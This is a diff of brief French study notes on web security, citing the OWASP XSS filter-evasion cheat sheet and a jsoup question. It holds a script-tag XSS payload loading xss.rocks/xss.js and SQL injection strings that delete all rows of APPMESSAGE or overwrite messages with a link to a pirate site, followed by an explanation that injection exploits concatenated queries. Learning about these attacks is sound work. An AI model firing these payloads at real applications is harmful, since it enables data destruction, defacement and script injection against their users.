@@ -7,8 +7,9 @@ https://stackoverflow.com/questions/8683018/jsoup-clean-without-adding-html-enti
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 
-EXPLOIT envoyer '); DELETE FROM APPMESSAGE; --
-
+EXPLOIT envoyer 
+'); DELETE FROM APPMESSAGE; --
+'); UPDATE APPMESSAGE SET CONTENT='Allez tous sur supersitepirate.com'; --
 
 Injection SQL : la plupart du temps des systèmes vieux avec SQL direct.
 Se repose sur le fait que les développeurs contruise la requête en faisant le + de morceaux à eux
